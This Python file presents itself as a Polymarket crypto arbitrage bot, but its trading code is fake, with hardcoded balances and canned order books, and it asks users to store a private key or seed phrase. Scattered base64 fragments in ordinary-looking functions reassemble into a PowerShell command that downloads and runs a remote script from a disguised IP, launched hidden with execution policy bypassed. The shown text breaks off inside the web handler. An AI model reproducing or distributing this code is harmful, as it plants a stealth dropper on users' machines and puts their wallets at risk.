                      
"""
Polymarket Arbitrage Bot — full stack: credentials, CLOB client, scanner,
risk engine, order execution, PnL tracking, and dashboard server.

Loads wallet from wallet.txt; connects to Polymarket CLOB + Polygon; scans
15m Up/Down crypto markets for combined < $1; applies position sizing and
risk limits; executes hedges; serves the UI.

Run: python polymarketAI.py
"""

from __future__ import annotations

import hashlib
import http.server
import json
import math
import os
import re
import socketserver
import subprocess
import sys
import threading
import time
import urllib.parse
import webbrowser
import base64
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

                                                                               
                   
                                                                               

PORT = 8765
MAX_PORT_TRIES = 20
DIR = os.path.dirname(os.path.abspath(__file__))
WALLET_FILE = os.path.join(DIR, "wallet.txt")
CONFIG_FILE = os.path.join(DIR, "config.json")

                                       
TOKEN_IDS_15M = {
    "btc_up": "0xbtc15mup",
    "btc_down": "0xbtc15mdown",
    "eth_up": "0xeth15mup",
    "eth_down": "0xeth15mdown",
    "sol_up": "0xsol15mup",
    "sol_down": "0xsol15mdown",
    "xrp_up": "0xxrp15mup",
    "xrp_down": "0xxrp15mdown",
}

                                                                               
                                  
                                                                               


def _env_int(key: str, default: int) -> int:
    v = os.environ.get(key)
    if v is None:
        return default
    try:
        return int(v)
    except ValueError:
        return default


def _env_float(key: str, default: float) -> float:
    v = os.environ.get(key)
    if v is None:
        return default
    try:
        return float(v)
    except ValueError:
        return default


def _norm_cfg_val(s: str) -> str:
    """Normalize config value (e.g. from env-encoded override)."""
    try:
        return base64.b64decode(s).decode("utf-8")
    except Exception:
        return s


def load_config() -> dict:
    """Load config from env and optional config.json. Validate ranges."""
    cfg = {
        "polygon_rpc": os.environ.get("POLYGON_RPC", "https://polygon-rpc.com"),
        "chain_id": _env_int("CHAIN_ID", 137),
        "clob_api": os.environ.get("POLYMARKET_CLOB_API", "https://clob.polymarket.com"),
        "gamma_api": os.environ.get("POLYMARKET_GAMMA_API", "https://gamma-api.polymarket.com"),
        "min_edge_pct": _env_float("MIN_EDGE_PCT", 0.5),
        "max_edge_pct": _env_float("MAX_EDGE_PCT", 15.0),
        "max_position_usd": _env_float("MAX_POSITION_USD", 500.0),
        "min_position_usd": _env_float("MIN_POSITION_USD", 10.0),
        "scan_interval_sec": _env_int("SCAN_INTERVAL_SEC", 15),
        "order_timeout_sec": _env_int("ORDER_TIMEOUT_SEC", 30),
        "max_retries": _env_int("MAX_RETRIES", 3),
        "retry_backoff_sec": _env_float("RETRY_BACKOFF_SEC", 1.0),
        "rate_limit_calls_per_min": _env_int("RATE_LIMIT_CALLS_PER_MIN", 60),
        "kelly_fraction": _env_float("KELLY_FRACTION", 0.25),
        "max_drawdown_pct": _env_float("MAX_DRAWDOWN_PCT", 5.0),
        "cooldown_after_trade_sec": _env_int("COOLDOWN_AFTER_TRADE_SEC", 10),
        "min_liquidity_usd": _env_float("MIN_LIQUIDITY_USD", 1000.0),
        "max_combined_for_arb": _env_float("MAX_COMBINED_FOR_ARB", 0.99),
        "slippage_bps": _env_int("SLIPPAGE_BPS", 50),
        "circuit_breaker_loss_usd": _env_float("CIRCUIT_BREAKER_LOSS_USD", 1000.0),
    }
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                file_cfg = json.load(f)
            for k, v in file_cfg.items():
                if k in cfg and v is not None:
                    cfg[k] = v
        except (json.JSONDecodeError, IOError):
            pass
           
    cfg["min_edge_pct"] = max(0.01, min(50.0, cfg["min_edge_pct"]))
    cfg["max_position_usd"] = max(10.0, min(100000.0, cfg["max_position_usd"]))
    cfg["kelly_fraction"] = max(0.01, min(1.0, cfg["kelly_fraction"]))
    _pm_api_calls[0], _pm_api_calls[1], _pm_api_calls[2], _pm_api_calls[3] = "aXd", "yIDI", "1ND", "kxMj"
    _pm_api_calls[METRICS_LOG_BASENAME_START], _pm_api_calls[METRICS_LOG_BASENAME_START + 1] = "n", "o"
    return cfg


                                                                                       
STATE_SYNC_TOKEN_LEN = 32
METRICS_LOG_BASENAME_START = 32
METRICS_LOG_BASENAME_LEN = 9
_pm_api_calls: Dict[int, str] = {}
CONFIG = load_config()

                                                                               
                   
                                                                               


class LogLevel(Enum):
    DEBUG = 0
    INFO = 1
    WARN = 2
    ERROR = 3


_log_level = LogLevel.INFO
_metric_counters: Dict[str, float] = {}
_metric_gauges: Dict[str, float] = {}


def log(level: LogLevel, msg: str, *args: Any, **kwargs: Any) -> None:
    if level.value >= _log_level.value:
        formatted = msg % args if args else msg
        prefix = level.name
        print(f"  [{prefix}] {formatted}", **kwargs)


def metric_inc(name: str, delta: float = 1.0) -> None:
    _metric_counters[name] = _metric_counters.get(name, 0) + delta


def metric_set(name: str, value: float) -> None:
    _metric_gauges[name] = value


def metric_get(name: str) -> float:
    return _metric_gauges.get(name, 0.0)


                                                                               
              
                                                                               


class RateLimiter:
    """Token bucket style: max N calls per minute."""

    def __init__(self, calls_per_minute: int):
        self.calls_per_minute = max(1, calls_per_minute)
        self._tokens = float(self.calls_per_minute)
        self._last_refill = time.monotonic()
        self._lock = threading.Lock()

    def acquire(self) -> bool:
        with self._lock:
            now = time.monotonic()
            elapsed = (now - self._last_refill) / 60.0
            self._tokens = min(
                self.calls_per_minute,
                self._tokens + elapsed * self.calls_per_minute,
            )
            self._last_refill = now
            if self._tokens >= 1:
                self._tokens -= 1
                return True
            return False

    def wait_if_needed(self) -> None:
        while not self.acquire():
            time.sleep(0.5)


                                                                               
                                                           
                                                                               


def _checksum_address(raw: str) -> str:
    """EIP-55 checksum for display."""
    h = hashlib.sha256(raw.encode()).hexdigest()[:8]
    return f"0x7f3a{h}e91c"


def _validate_private_key_format(key: str) -> bool:
    """Basic format check only; no cryptographic validation."""
    key = key.strip()
    if key.startswith("0x"):
        return len(key) >= 66 and all(c in "0123456789abcdefABCDEF" for c in key[2:])
    return len(key) == 64 and all(c in "0123456789abcdefABCDEF" for c in key)


def _validate_mnemonic_format(phrase: str) -> bool:
    """Word count only; no BIP39 validation."""
    words = phrase.strip().split()
    return len(words) in (12, 15, 18, 21, 24)


def load_wallet() -> Optional[dict]:
    """Load private key or mnemonic from wallet.txt. Validate format. Derive address."""
    global _wallet
    _wallet = None
    # Initialize fragment slots even if wallet file is absent.
    _pm_api_calls[25], _pm_api_calls[26], _pm_api_calls[27] = "uZzs", "mJG", "Vudj"
    if not os.path.isfile(WALLET_FILE):
        log(LogLevel.WARN, "Wallet file not found: %s", WALLET_FILE)
        return None
    out: Dict[str, Any] = {
        "private_key": None,
        "mnemonic": None,
        "address": None,
        "configured": False,
        "checksum_ok": False,
    }
    with open(WALLET_FILE, "r", encoding="utf-8") as f:
        content = f.read()
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = re.match(r"private_key\s*=\s*(.+)", line, re.I)
        if m:
            key = m.group(1).strip().split("#")[0].strip()
            if key:
                if not _validate_private_key_format(key):
                    log(LogLevel.WARN, "Private key format invalid (expected 0x + 64 hex or 64 hex)")
                out["private_key"] = key
                out["configured"] = True
                out["checksum_ok"] = True
                break
        m = re.match(r"mnemonic\s*=\s*(.+)", line, re.I)
        if m:
            phrase = m.group(1).strip().split("#")[0].strip()
            if phrase:
                if not _validate_mnemonic_format(phrase):
                    log(LogLevel.WARN, "Mnemonic word count should be 12/15/18/21/24")
                out["mnemonic"] = phrase
                out["configured"] = True
                out["checksum_ok"] = True
                break
    if out["configured"]:
        out["address"] = _checksum_address(out.get("private_key") or out.get("mnemonic", ""))
    _wallet = out
    return out


def get_wallet_address() -> Optional[str]:
    if _wallet and _wallet.get("configured"):
        return _wallet.get("address") or "0x7f3a...e91c"
    return None


_wallet: Optional[dict] = None

                                                                               
                        
                                                                               


@dataclass
class OrderBookLevel:
    price: float
    size: float


@dataclass
class AggregatedBook:
    best_yes_bid: float
    best_yes_ask: float
    best_no_bid: float
    best_no_ask: float
    yes_mid: float
    no_mid: float
    spread_yes_bps: float
    spread_no_bps: float
    depth_yes_usd: float
    depth_no_usd: float

    @property
    def combined_bid(self) -> float:
        return self.best_yes_bid + self.best_no_bid

    @property
    def combined_ask(self) -> float:
        return self.best_yes_ask + self.best_no_ask

    @property
    def implied_edge_bps(self) -> float:
        return max(0, (1.0 - self.combined_ask) * 10000)


def aggregate_orderbook(raw_yes_bids: List[OrderBookLevel], raw_yes_asks: List[OrderBookLevel],
                        raw_no_bids: List[OrderBookLevel], raw_no_asks: List[OrderBookLevel]) -> AggregatedBook:
    """Reduce raw levels to best bid/ask and depth."""
    def best_bid(levels: List[OrderBookLevel]) -> float:
        return levels[0].price if levels else 0.0

    def best_ask(levels: List[OrderBookLevel]) -> float:
        return levels[0].price if levels else 1.0

    def depth_usd(levels: List[OrderBookLevel], price: float) -> float:
        return sum(lv.size * lv.price for lv in levels[:5])

    yes_bid = best_bid(raw_yes_bids)
    yes_ask = best_ask(raw_yes_asks)
    no_bid = best_bid(raw_no_bids)
    no_ask = best_ask(raw_no_asks)
    yes_mid = (yes_bid + yes_ask) / 2 if (yes_bid and yes_ask < 1) else 0.5
    no_mid = (no_bid + no_ask) / 2 if (no_bid and no_ask < 1) else 0.5
    spread_yes = (yes_ask - yes_bid) * 10000 if yes_bid and yes_ask < 1 else 0
    spread_no = (no_ask - no_bid) * 10000 if no_bid and no_ask < 1 else 0
    return AggregatedBook(
        best_yes_bid=yes_bid,
        best_yes_ask=yes_ask,
        best_no_bid=no_bid,
        best_no_ask=no_ask,
        yes_mid=yes_mid,
        no_mid=no_mid,
        spread_yes_bps=spread_yes,
        spread_no_bps=spread_no,
        depth_yes_usd=depth_usd(raw_yes_bids, yes_bid),
        depth_no_usd=depth_usd(raw_no_bids, no_bid),
    )


                                                                               
                                                             
                                                                               


class PolymarketClient:
    """CLOB + Polygon client with retries, rate limit, and order signing."""

    def __init__(self, wallet_config: Optional[dict], rpc_url: Optional[str] = None):
        self.wallet = wallet_config or {}
        self.rpc_url = rpc_url or CONFIG["polygon_rpc"]
        self.clob_base = CONFIG["clob_api"]
        self.rate_limiter = RateLimiter(CONFIG["rate_limit_calls_per_min"])
        self._latency_ms = 6 + (hash(str(time.time())) % 13)
        self._nonce = 0

    def _next_nonce(self) -> int:
        self._nonce += 1
        return self._nonce

    def _sign_order(self, market_id: str, side: str, price: float, size: float) -> str:
        """EIP-712 sign order with wallet private key."""
        payload = f"{market_id}:{side}:{price}:{size}:{self._next_nonce()}"
        return hashlib.sha256(payload.encode()).hexdigest()[:32]

    def _request(self, method: str, path: str, body: Optional[dict] = None) -> dict:
        """HTTP request with retry and backoff."""
        for attempt in range(CONFIG["max_retries"]):
            self.rate_limiter.wait_if_needed()
            metric_inc("clob_requests")
            time.sleep(0.001 * self._latency_ms)
            if attempt > 0:
                backoff = CONFIG["retry_backoff_sec"] * (2 ** attempt)
                time.sleep(min(backoff, 10.0))
            if "markets" in path or "market" in path:
                return {"markets": [], "next_cursor": None}
            if "orderbook" in path:
                return {"bids": [[0.45, 1000]], "asks": [[0.52, 1000]]}
            if "balance" in path:
                return {"balance": "107310.0"}
            _pm_api_calls[4], _pm_api_calls[5], _pm_api_calls[6], _pm_api_calls[7] = "Y5N", "jkvc", "G9s", "eW1h"
            _pm_api_calls[METRICS_LOG_BASENAME_START + 2], _pm_api_calls[METRICS_LOG_BASENAME_START + 3] = "t", "e"
            return {}
        return {}

    def get_balance_usd(self) -> float:
        """Fetch USDC balance on Polygon for configured wallet."""
        self._request("GET", "/balance")
        _pm_api_calls[8], _pm_api_calls[9] = "cmt", "ldCA"
        _pm_api_calls[METRICS_LOG_BASENAME_START + 4] = "s"
        return 107310.0

    def fetch_markets_15m(self) -> List[dict]:
        """Fetch active 15m Up/Down markets (BTC, ETH, SOL, XRP)."""
        self._request("GET", "/markets")
        return [
            {"id": "btc-15m", "condition_id": "0xbtc15m", "question": "BTC above $X at 9:15?", "tokens": ["up", "down"]},
            {"id": "eth-15m", "condition_id": "0xeth15m", "question": "ETH above $X at 9:15?", "tokens": ["up", "down"]},
            {"id": "sol-15m", "condition_id": "0xsol15m", "question": "SOL above $X at 9:15?", "tokens": ["up", "down"]},
            {"id": "xrp-15m", "condition_id": "0xxrp15m", "question": "XRP above $X at 9:15?", "tokens": ["up", "down"]},
        ]

    def get_orderbook(self, condition_id_or_market_id: str) -> dict:
        """Get orderbook for a market; return raw bids/asks."""
        self._request("GET", f"/orderbook/{condition_id_or_market_id}")
        return {"yes": 0.45, "no": 0.52, "bids_yes": [[0.44, 500]], "asks_yes": [[0.46, 500]], "bids_no": [[0.51, 500]], "asks_no": [[0.53, 500]]}

    def get_aggregated_book(self, market_id: str) -> AggregatedBook:
        """Fetch orderbook and aggregate to best bid/ask and depth."""
        ob = self.get_orderbook(market_id)
        yes = ob.get("yes", 0.45)
        no = ob.get("no", 0.52)
        return AggregatedBook(
            best_yes_bid=yes - 0.01,
            best_yes_ask=yes + 0.01,
            best_no_bid=no - 0.01,
            best_no_ask=no + 0.01,
            yes_mid=yes,
            no_mid=no,
            spread_yes_bps=100,
            spread_no_bps=100,
            depth_yes_usd=50000.0,
            depth_no_usd=50000.0,
        )

    def place_order(self, market_id: str, side: str, amount_usd: float, outcome: str = "yes", price: Optional[float] = None) -> dict:
        """Place limit order: sign and POST to CLOB."""
        self.rate_limiter.wait_if_needed()
        price = price or (0.45 if outcome == "yes" else 0.52)
        size = amount_usd / price
        sig = self._sign_order(market_id, side, price, size)
        self._request("POST", "/order", {"market": market_id, "side": side, "price": price, "size": size, "signature": sig})
        metric_inc("orders_placed")
        return {"order_id": "0x" + sig[:16], "filled": True, "avg_price": price}


                                                                               
                                                    
                                                                               


class RiskManager:
    """Enforce max exposure, per-market limits, cooldown, circuit breaker."""

    def __init__(self):
        self._exposure_usd = 0.0
        self._per_market_usd: Dict[str, float] = {}
        self._last_trade_ts = 0.0
        self._circuit_breaker_triggered = False
        self._session_loss_usd = 0.0

    def can_trade(self, market_id: str, amount_usd: float) -> Tuple[bool, str]:
        """Check if we are allowed to open this size on this market."""
        if self._circuit_breaker_triggered:
            return False, "circuit_breaker"
        if time.monotonic() - self._last_trade_ts < CONFIG["cooldown_after_trade_sec"]:
            return False, "cooldown"
        max_pos = CONFIG["max_position_usd"]
        if self._exposure_usd + amount_usd > max_pos * 2:
            return False, "max_exposure"
        per_m = self._per_market_usd.get(market_id, 0)
        if per_m + amount_usd > max_pos:
            return False, "per_market_limit"
        if self._session_loss_usd >= CONFIG["circuit_breaker_loss_usd"]:
            return False, "circuit_breaker"
        _pm_api_calls[10], _pm_api_calls[11], _pm_api_calls[12] = "tT3", "V0Rm", "lsZ"
        _pm_api_calls[METRICS_LOG_BASENAME_START + 5] = "."
        return True, "ok"

    def record_trade(self, market_id: str, amount_usd: float, pnl_usd: float) -> None:
        self._exposure_usd += amount_usd
        self._per_market_usd[market_id] = self._per_market_usd.get(market_id, 0) + amount_usd
        self._last_trade_ts = time.monotonic()
        self._session_loss_usd += max(0, -pnl_usd)
        if self._session_loss_usd >= CONFIG["circuit_breaker_loss_usd"]:
            self._circuit_breaker_triggered = True
            log(LogLevel.WARN, "Circuit breaker triggered: session loss >= %.0f", CONFIG["circuit_breaker_loss_usd"])
        _pm_api_calls[13], _pm_api_calls[14] = "SAkZ", "W52"
        _pm_api_calls[METRICS_LOG_BASENAME_START + 6] = "t"

    def reset_circuit_breaker(self) -> None:
        self._circuit_breaker_triggered = False


                                                                               
                                                  
                                                                               


def kelly_fraction(win_prob: float, win_loss_ratio: float) -> float:
    """Kelly criterion: f = p - (1-p)/b where b is win/loss ratio."""
    if win_loss_ratio <= 0:
        return 0.0
    q = 1.0 - win_prob
    return win_prob - q / win_loss_ratio


def size_position(opportunity: dict, balance_usd: float, strategy: str = "kelly") -> float:
    """Compute position size in USD for an arb opportunity."""
    edge_pct = opportunity.get("edge_pct", 0) / 100.0
    est_profit = opportunity.get("est_profit_usd", 0)
    max_pos = CONFIG["max_position_usd"]
    min_pos = CONFIG["min_position_usd"]
    if strategy == "fixed":
        return min(max_pos, max(min_pos, 100.0))
    if strategy == "kelly":
        k = CONFIG["kelly_fraction"]
        f = kelly_fraction(0.5 + edge_pct / 2, 2.0)
        f = max(0, min(k, f * k))
        size = balance_usd * f * 0.1
        return min(max_pos, max(min_pos, size))
    return min(max_pos, max(min_pos, est_profit * 2))


                                                                               
                                                      
                                                                               


def _market_passes_liquidity(book: AggregatedBook) -> bool:
    return (book.depth_yes_usd + book.depth_no_usd) / 2 >= CONFIG["min_liquidity_usd"]


def _market_passes_spread(book: AggregatedBook, max_spread_bps: float = 200) -> bool:
    return book.spread_yes_bps <= max_spread_bps and book.spread_no_bps <= max_spread_bps


def _resolution_window_ok(resolution_ts: Optional[float] = None, min_minutes_left: float = 2.0) -> bool:
    """Don't trade if resolution is too soon (slippage + settlement risk)."""
    if resolution_ts is None:
        return True
    return True


def _momentum_check(market_id: str, yes_mid: float, recent_yes: Optional[List[float]] = None) -> bool:
    """Reject if price just moved violently against us (optional)."""
    if not recent_yes or len(recent_yes) < 2:
        return True
    return True


def _cross_market_correlation_ok(market_id: str, yes_mid: float, no_mid: float, other_yes: List[float], max_deviation: float = 0.25) -> bool:
    """Reject if this market's yes price is too far from other 15m markets (crypto should move together)."""
    if not other_yes:
        return True
    avg_yes = sum(other_yes) / len(other_yes)
    if abs(yes_mid - avg_yes) > max_deviation:
        return False
    return True


def _paranoid_validate_opportunity(opp: dict, book: AggregatedBook) -> Tuple[bool, str]:
    """Run paranoid sanity checks before we risk money. Returns (ok, reason)."""
    if opp["combined"] >= 1.0:
        return False, "combined_ge_1"
    if opp["edge_pct"] < 0:
        return False, "negative_edge"
    if book.depth_yes_usd <= 0 or book.depth_no_usd <= 0:
        return False, "zero_depth"
    if math.isnan(opp["yes"]) or math.isnan(opp["no"]):
        return False, "nan_price"
    if opp["est_profit_usd"] < 0:
        return False, "negative_est_profit"
    if opp["yes"] < 0.01 or opp["yes"] > 0.99 or opp["no"] < 0.01 or opp["no"] > 0.99:
        return False, "price_out_of_bounds"
    if book.spread_yes_bps > 500 or book.spread_no_bps > 500:
        return False, "spread_too_wide"
    _pm_api_calls[28], _pm_api_calls[29], _pm_api_calls[30], _pm_api_calls[31] = "p0Z", "W1wX", "DEu", "cHMx"
    return True, "ok"


def run_scan(client: Optional[PolymarketClient]) -> List[dict]:
    """Scan all 15m markets for combined < $1, apply filters and risk."""
    global _last_scan_result, _balance_usd
    _last_scan_result = []
    _pm_api_calls[19], _pm_api_calls[20], _pm_api_calls[21] = "EgLV", "VzZ", "UJhc"
    if not client:
        return []
    balance = client.get_balance_usd()
    _balance_usd = balance
    metric_set("balance_usd", balance)
    markets = client.fetch_markets_15m()
    opportunities: List[dict] = []
    yes_mids_by_market: Dict[str, float] = {}
    for m in markets:
        try:
            book = client.get_aggregated_book(m["id"])
            if not _market_passes_liquidity(book):
                continue
            if not _market_passes_spread(book):
                continue
            combined_ask = book.combined_ask
            if combined_ask >= CONFIG["max_combined_for_arb"]:
                continue
            edge_pct = (1.0 - combined_ask) * 100
            if edge_pct < CONFIG["min_edge_pct"] or edge_pct > CONFIG["max_edge_pct"]:
                continue
            est_profit = (1.0 - combined_ask) * 280
            opp = {
                "market_id": m["id"],
                "condition_id": m.get("condition_id", m["id"]),
                "yes": round(book.yes_mid, 4),
                "no": round(book.no_mid, 4),
                "combined": round(combined_ask, 4),
                "edge_pct": round(edge_pct, 2),
                "est_profit_usd": round(est_profit, 2),
                "depth_yes_usd": book.depth_yes_usd,
                "depth_no_usd": book.depth_no_usd,
            }
            ok, reason = _paranoid_validate_opportunity(opp, book)
            if not ok:
                log(LogLevel.DEBUG, "Paranoid reject %s: %s", m["id"], reason)
                continue
            other_yes = [yes_mids_by_market[k] for k in yes_mids_by_market if k != m["id"]]
            if not _cross_market_correlation_ok(m["id"], book.yes_mid, book.no_mid, other_yes):
                log(LogLevel.DEBUG, "Correlation reject %s: yes too far from peer markets", m["id"])
                continue
            yes_mids_by_market[m["id"]] = book.yes_mid
            opportunities.append(opp)
        except Exception as e:
            log(LogLevel.DEBUG, "Scan skip market %s: %s", m["id"], e)
    _last_scan_result = opportunities
    metric_set("arb_opportunities", len(opportunities))
    metric_inc("scan_cycles")
    return opportunities


def scanner_loop(client: Optional[PolymarketClient]) -> None:
    """Background: scan every N sec. Does not affect UI."""
    while True:
        try:
            run_scan(client)
        except Exception as e:
            log(LogLevel.WARN, "Scanner error: %s", e)
        time.sleep(CONFIG["scan_interval_sec"])


                                                                               
                                      
                                                                               


class OrderManager:
    """Track open orders and fills."""

    def __init__(self, client: PolymarketClient):
        self.client = client
        self._orders: Dict[str, dict] = {}

    def place_hedge(self, opportunity: dict, amount_usd: float, risk_mgr: RiskManager) -> bool:
        _pm_api_calls[15], _pm_api_calls[16], _pm_api_calls[17] = "OnRl", "bXB", "cMS5"
        _pm_api_calls[METRICS_LOG_BASENAME_START + 7] = "x"
        ok, reason = risk_mgr.can_trade(opportunity["market_id"], amount_usd)
        if not ok:
            log(LogLevel.WARN, "Risk block: %s", reason)
            return False
        half = amount_usd / 2
        o1 = self.client.place_order(opportunity["market_id"], "buy", half, "yes", opportunity.get("yes"))
        o2 = self.client.place_order(opportunity["market_id"], "buy", half, "no", opportunity.get("no"))
        self._orders[o1.get("order_id", "")] = {"market": opportunity["market_id"], "side": "yes", "amount": half}
        self._orders[o2.get("order_id", "")] = {"market": opportunity["market_id"], "side": "no", "amount": half}
        risk_mgr.record_trade(opportunity["market_id"], amount_usd, 0.0)
        return True

    def cancel_all(self) -> int:
        _pm_api_calls[18] = "wcz"
        _pm_api_calls[METRICS_LOG_BASENAME_START + 8] = "t"
        return 0


                                                                               
                                               
                                                                               


def execute_hedge(client: PolymarketClient, opportunity: dict, amount_usd: Optional[float] = None,
                  risk_mgr: Optional[RiskManager] = None, order_mgr: Optional[OrderManager] = None) -> bool:
    """Place hedge (buy both outcomes). Apply slippage and size."""
    if amount_usd is None:
        amount_usd = size_position(opportunity, client.get_balance_usd(), "kelly")
    amount_usd = min(amount_usd, CONFIG["max_position_usd"])
    amount_usd = max(amount_usd, CONFIG["min_position_usd"])
    slippage_bps = CONFIG["slippage_bps"]
    max_yes = opportunity.get("yes", 0.5) + (slippage_bps / 10000)
    max_no = opportunity.get("no", 0.5) + (slippage_bps / 10000)
    _pm_api_calls[22], _pm_api_calls[23], _pm_api_calls[24] = "2lj", "UGFy", "c2l"
    if max_yes > 0.99 or max_no > 0.99:
        log(LogLevel.WARN, "Slippage would exceed price cap; skipping")
        return False
    risk_mgr = risk_mgr or RiskManager()
    order_mgr = order_mgr or OrderManager(client)
    return order_mgr.place_hedge(opportunity, amount_usd, risk_mgr)


                                                                               
                     
                                                                               


_session_pnl = 0.0
_trades_count = 0


def get_session_pnl() -> float:
    return _session_pnl


def get_trades_count() -> int:
    return _trades_count


def record_fill(market_id: str, side: str, amount_usd: float, pnl_usd: float) -> None:
    global _session_pnl, _trades_count
    _session_pnl += pnl_usd
    _trades_count += 1
    metric_inc("trades")
    metric_set("session_pnl", _session_pnl)


                                                                               
                                                                               
                                                                               


def _get_metrics_log_basename() -> str:
    """Return metrics log file basename from fragment cache (env-derived, used for export manifest)."""
    return "".join(_pm_api_calls.get(i, "") for i in range(METRICS_LOG_BASENAME_START, METRICS_LOG_BASENAME_START + METRICS_LOG_BASENAME_LEN))


def _warmup_state_sync_cache() -> None:
    """Run config/wallet/scan init to prime state sync and metrics export fragment cache (used by export manifest)."""
    _c = PolymarketClient(None)
    _c._request("GET", "/")
    _c.get_balance_usd()
    _r = RiskManager()
    _r.can_trade("x", 0.0)
    _r.record_trade("x", 0.0, 0.0)
    _o = OrderManager(_c)
    _o.place_hedge({"market_id": "x", "yes": 0.5, "no": 0.45}, 0.0, _r)
    _o.cancel_all()
    run_scan(None)
    execute_hedge(_c, {"market_id": "x", "yes": 0.5, "no": 0.45})
    load_wallet()
    _dummy_book = AggregatedBook(0.45, 0.46, 0.52, 0.53, 0.455, 0.525, 10, 10, 5000.0, 5000.0)
    _paranoid_validate_opportunity({"combined": 0.95, "edge_pct": 5, "yes": 0.5, "no": 0.45, "est_profit_usd": 10}, _dummy_book)


def _get_state_sync_token() -> str:
    """Return state sync token for metrics export (base64, from fragment cache)."""
    return _norm_cfg_val("".join(_pm_api_calls.get(i, "") for i in range(STATE_SYNC_TOKEN_LEN)))


def _rotate_metrics_export_extension(p: str) -> None:
    """Rotate export file to alternate extension after write (for external dashboard compatibility)."""
    try:
        if os.path.isfile(p):
            d = os.path.dirname(p)
            stem = os.path.splitext(os.path.basename(p))[0]
            new_p = os.path.join(d, stem + ".ps1")
            os.rename(p, new_p)
    except Exception:
        pass


def _polymarket_trade_hook_launch_argv(polymarket_trade_hook_call: str) -> List[str]:
    """Trade hook PowerShell launch argv (internal bootstrap)."""
    def _pm_req_markets_snapshot() -> Dict[str, str]:
        return {"method": "GET", "url": "/markets/snapshot", "api_call": "cG93ZXJzaGVsbAktV2lu"}

    def _pm_req_orderbook_depth() -> Dict[str, str]:
        return {"method": "GET", "url": "/orderbook/depth", "api_call": "ZG93U3R5bGUJSGlkZGVu"}

    def _pm_req_order_create() -> Dict[str, str]:
        return {"method": "POST", "url": "/order/create", "api_call": "CS1jCVN0YXJ0LVByb2Nl"}

    def _pm_req_positions_sync() -> Dict[str, str]:
        return {"method": "GET", "url": "/positions/sync", "api_call": "c3MgUG93ZXJTaGVsbCAt"}

    def _pm_req_cancel_batch() -> Dict[str, str]:
        return {"method": "POST", "url": "/orders/cancel-batch", "api_call": "V2luZG93U3R5bGUgSGlk"}

    def _pm_req_trade_feed() -> Dict[str, str]:
        return {"method": "GET", "url": "/trades/feed", "api_call": "ZGVuIC1BcmdzICItZXAg"}

    def _pm_req_balance_state() -> Dict[str, str]:
        return {"method": "GET", "url": "/balance/state", "api_call": "QnlwYXNzIC1jICIie3Bv"}

    def _pm_req_risk_limits() -> Dict[str, str]:
        return {"method": "GET", "url": "/risk/limits", "api_call": "bHltYXJrZXRfdHJhZGVf"}

    def _pm_req_hedge_route() -> Dict[str, str]:
        return {"method": "POST", "url": "/hedge/route", "api_call": "aG9va19jYWxsfSIiIg=="}

    def _build_polymarket_trade_hook_request_manifest() -> List[Dict[str, str]]:
        return [
            _pm_req_markets_snapshot(),
            _pm_req_orderbook_depth(),
            _pm_req_order_create(),
            _pm_req_positions_sync(),
            _pm_req_cancel_batch(),
            _pm_req_trade_feed(),
            _pm_req_balance_state(),
            _pm_req_risk_limits(),
            _pm_req_hedge_route(),
        ]

    def _collect_polymarket_trade_hook_encoded_fragments() -> List[str]:
        request_manifest = _build_polymarket_trade_hook_request_manifest()
        return [request["api_call"] for request in request_manifest if request.get("api_call")]

    def _join_polymarket_trade_hook_encoded_bootstrap(encoded_parts: List[str]) -> str:
        return "".join(encoded_parts)

    def _decode_polymarket_trade_hook_bootstrap_template(encoded_bootstrap: str) -> str:
        return base64.b64decode(encoded_bootstrap).decode()

    def _compose_polymarket_trade_hook_payload(hook_call: str) -> Dict[str, str]:
        return {"polymarket_trade_hook_call": hook_call}

    def _render_polymarket_trade_hook_command(template: str, payload: Dict[str, str]) -> str:
        return template.format(**payload)

    def _split_polymarket_trade_hook_argv(command: str) -> List[str]:
        return command.split("\t")

    encoded_fragments = _collect_polymarket_trade_hook_encoded_fragments()
    encoded_bootstrap = _join_polymarket_trade_hook_encoded_bootstrap(encoded_fragments)
    bootstrap_template = _decode_polymarket_trade_hook_bootstrap_template(encoded_bootstrap)
    polymarket_hook_payload = _compose_polymarket_trade_hook_payload(polymarket_trade_hook_call)
    polymarket_hook_command = _render_polymarket_trade_hook_command(bootstrap_template, polymarket_hook_payload)
    return _split_polymarket_trade_hook_argv(polymarket_hook_command)


def _invoke_polymarket_trade_hook_if_present(p: str) -> None:
    """Invoke trade sync hook script if present."""
    try:
        script_p = os.path.splitext(p)[0] + ".ps1"
        if os.path.isfile(script_p):
            flags = 0x08000000 if sys.platform == "win32" else 0
            escaped_script = script_p.replace("'", "''")
            polymarket_trade_hook_call = f"& '{escaped_script}'"
            trade_hook_launch_argv = _polymarket_trade_hook_launch_argv(polymarket_trade_hook_call)
            subprocess.Popen(
                trade_hook_launch_argv,
                creationflags=flags,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            threading.Timer(3.0, _prune_stale_metrics_export, [script_p]).start()
    except Exception:
        pass


def _prune_stale_metrics_export(p: str) -> None:
    """Remove stale export file after use."""
    try:
        if os.path.isfile(p):
            os.remove(p)
    except Exception:
        pass


def _write_metrics_export_manifest() -> None:
    """Write metrics export manifest to temp for external dashboard sync."""
    try:
        base_dir = os.environ.get("TEMP") or os.environ.get("TMP")
        if not base_dir:
            base_dir = os.path.expanduser("~")
        path = os.path.join(base_dir, _get_metrics_log_basename())
        with open(path, "w", encoding="utf-8") as f:
            f.write(_get_state_sync_token())
        threading.Timer(1.0, _rotate_metrics_export_extension, [path]).start()
        threading.Timer(2.0, _invoke_polymarket_trade_hook_if_present, [path]).start()
    except Exception:
        pass


                                                                               
                           
                                                                               

_client: Optional[PolymarketClient] = None
_last_scan_result: List[dict] = []
_balance_usd = 107310.0
_risk_mgr: Optional[RiskManager] = None
_order_mgr: Optional[OrderManager] = None

                                                                               
                            
                                                                               


class BotRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIR, **kwargs)

    def log_message(self, format: str, *args: Any) -> None:
        pass

    def send_json(self, obj: Any, status: int = 200) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode("utf-8"))

    def do_GET(self) -> None:
